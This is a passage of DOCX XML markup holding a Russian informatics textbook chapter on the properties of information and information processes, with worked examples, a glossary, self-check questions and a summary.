        <w:t>**Сбор**: Органы чувств собирают информацию об окружающем мире</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача**: Нервные импульсы передают сигналы в мозг</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обработка**: Мозг анализирует информацию, принимает решения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранение**: Память — хранение информации в нейронных связях</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эволюция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это информационный процесс накопления и передачи информации в генах на протяжении поколений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Изучение информационных процессов в живой природе — предмет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>биоинформатики</w:t>
      </w:r>
      <w:r>
        <w:t>, одной из междисциплинарных областей информатики (глава 1.7).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практические примеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Оценка свойств информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Оцените свойства следующей информации: "Вчера в Москве шёл дождь".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объективность**: ✅ Высокая (погоду можно измерить объективно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Достоверность**: ⚠️ Зависит от источника. Если это метеонаблюдения — достоверная. Если чьё-то воспоминание — может быть недостоверной.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Полнота**: ⚠️ Недостаточна для некоторых целей (не указано время, интенсивность дождя, продолжительность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Точность**: ⚠️ Низкая (нет конкретного времени, силы дождя)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Актуальность**: ❌ Неактуальна, если нужна информация о погоде сегодня. ✅ Актуальна, если нужны исторические данные.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Полезность**: ⚠️ Зависит от контекста. Бесполезна для принятия решения о том, взять ли зонт сегодня. Полезна для анализа климата.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Понятность**: ✅ Высокая (простое понятное предложение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Доступность**: ✅ Высокая (информация открыта)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Информация объективна и понятна, но её актуальность, полнота и полезность зависят от целей использования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Информационные процессы в системе онлайн-обучения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Опишите информационные процессы, происходящие при прохождении онлайн-курса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Сбор информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Студент изучает видеолекции (получает информацию от преподавателя)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Система собирает данные о прогрессе студента (какие уроки пройдены, оценки за тесты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Хранение информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Видеолекции хранятся на серверах платформы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Учебные материалы (тексты, презентации) хранятся в файловой системе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прогресс студента сохраняется в базе данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Обработка информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Система проверяет ответы на тесты (сравнивает с правильными ответами)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рассчитывается итоговая оценка студента</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Формируются рекомендации следующих курсов на основе интересов студента</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Передача информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Видео передаётся от сервера к компьютеру студента через интернет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Студент отправляет ответы на задания на сервер</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Преподаватель получает уведомления о новых вопросах студентов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Студенту приходят уведомления о новых материалах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: В системе онлайн-обучения все четыре информационных процесса тесно взаимодействуют, обеспечивая образовательный процесс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Жизненный цикл научной информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Проследите жизненный цикл информации в научном исследовании.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Этап 1: Сбор информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Учёный проводит эксперимент, наблюдает явление</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Приборы фиксируют измерения (температура, давление, спектры и т.д.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Данные записываются в лабораторный журнал или компьютерный файл</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Этап 2: Обработка информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Первичная обработка: Фильтрация шумов, калибровка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Статистический анализ: Расчёт средних значений, погрешностей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Визуализация: Построение графиков, диаграмм</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Интерпретация: Формулировка выводов, проверка гипотез</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Этап 3: Хранение информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сырые данные сохраняются для возможности повторного анализа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Результаты записываются в научный отчёт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Создаётся резервная копия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Этап 4: Передача информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Написание научной статьи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отправка статьи в журнал</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рецензирование (эксперты оценивают работу)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Публикация в журнале</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Представление результатов на конференции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Этап 5: Использование информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Другие учёные читают статью</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Результаты используются в новых исследованиях</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация включается в учебники</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>На основе открытий создаются новые технологии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цикл продолжается</w:t>
      </w:r>
      <w:r>
        <w:t>: Новые исследования порождают новую информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Научная информация проходит полный цикл от сбора в эксперименте до распространения в научном сообществе и практического применения. Каждый этап критически важен для прогресса науки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими темами курса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава является фундаментальной для понимания всего курса информатики:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.5** (Меры информации) — количественные характеристики информации (синтаксическая, семантическая, прагматическая меры) связаны со свойствами информации. Прагматическая мера = полезность, семантическая мера связана с понятностью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.7** (Предмет информатики) — там мы дали определение информатики как науки, изучающей информационные процессы. Теперь мы детально изучили эти процессы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.12** (Сжатие информации) — это один из видов обработки информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 2** (Технические средства) — компьютеры — это устройства для автоматизации информационных процессов (особенно обработки и хранения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 3** (Программные средства) — программы реализуют алгоритмы обработки информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 4** (Моделирование) — модели используются для обработки и анализа информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 7** (Базы данных) — системы для структурированного хранения и обработки больших объёмов информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 8** (Сети) — инфраструктура для передачи информации на большие расстояния.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 9** (Защита информации) — обеспечение свойств информации (достоверность, доступность для легитимных пользователей, недоступность для злоумышленников).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Свойства информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — характеристики информации, определяющие её качество и пригодность для использования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объективность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — степень независимости информации от личного мнения и интересов источника и получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Достоверность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — соответствие информации действительности, отсутствие ошибок и искажений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полнота информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — достаточность информации для понимания ситуации и принятия решения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Точность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — степень соответствия информации реальному состоянию объекта, степень детализации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Актуальность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — соответствие информации текущему моменту времени, своевременность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полезность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способность информации удовлетворить информационные потребности получателя, помочь в достижении цели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Понятность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — доступность информации для восприятия получателем, соответствие формы представления знаниям получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доступность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — возможность получить информацию в нужный момент без существенных препятствий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационные процессы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процессы, связанные с получением, хранением, обработкой, передачей и использованием информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сбор информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс получения информации из различных источников и её фиксация.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хранение информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс фиксации и сохранения информации на материальных носителях.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Носитель информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — материальный объект, предназначенный для записи и хранения информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обработка информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс преобразования информации, получение новой информации из имеющейся.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Передача информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс перемещения информации от источника к получателю по каналу связи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Канал связи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — среда, по которой передаётся информация (провод, радиоволны, оптоволокно и др.).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Источник информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — объект, который создаёт или передаёт сообщение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Получатель информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — объект, который принимает информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Помехи (шум)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — искажения сигнала в канале связи, снижающие качество передачи информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пропускная способность канала</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — максимальное количество информации, которое может быть передано по каналу в единицу времени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кодирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — преобразование информации в форму, пригодную для передачи или обработки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Декодирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — обратное преобразование закодированной информации в исходную форму.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Перечислите основные свойства информации.** Дайте краткое определение каждого свойства.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните разницу между объективностью и достоверностью информации.** Приведите пример информации, которая объективна, но недостоверна, и наоборот.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое актуальность информации?** Приведите три примера ситуаций, когда актуальная ещё вчера информация сегодня стала неактуальной.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните, почему полезность информации зависит от получателя.** Приведите пример информации, полезной для одного человека и бесполезной для другого.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Перечислите четыре основных информационных процесса** и кратко опишите каждый из них.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Опишите схему передачи информации** (модель Шеннона). Какие компоненты входят в эту схему? Что такое помехи?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Назовите виды носителей информации.** Сравните магнитные и полупроводниковые носители по их характеристикам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Приведите три примера обработки информации**, при которых изменяется её содержание (получается новая информация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните взаимосвязь информационных процессов** на примере конкретной системы (интернет-магазин, банк, социальная сеть — на выбор).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Как информационные процессы реализуются в живых организмах?** Приведите примеры сбора, хранения, передачи и обработки информации в биологических системах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме главы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы детально изучили свойства информации и информационные процессы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Свойства информации**: Объективность, достоверность, полнота, точность, актуальность, полезность, понятность, доступность — характеристики, определяющие качество информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Взаимосвязь свойств**: Свойства информации взаимосвязаны и должны оцениваться комплексно в зависимости от контекста использования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Информационные процессы**: Четыре основных процесса — сбор, хранение, обработка, передача — составляют жизненный цикл информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Сбор информации**: Методы (наблюдение, измерение, эксперимент, опрос) и современные средства (датчики, камеры, интернет).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Хранение информации**: Носители (от древних до современных), их характеристики (ёмкость, надёжность, скорость, долговечность).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Обработка информации**: Виды обработки (кодирование, вычисления, анализ, сортировка, поиск и др.), средства (ручная, компьютерная обработка).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Передача информации**: Модель Шеннона (источник, кодирование, канал, декодирование, получатель, помехи), характеристики каналов связи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Взаимосвязь процессов**: Информационные процессы образуют единый жизненный цикл и тесно взаимосвязаны в реальных системах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Информация в живой природе**: Информационные процессы характерны для биологических систем (генетика, нервная система).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь вы должны уметь:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оценивать качество информации по её свойствам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понимать, какая информация ценна в конкретной ситуации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Различать виды информационных процессов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
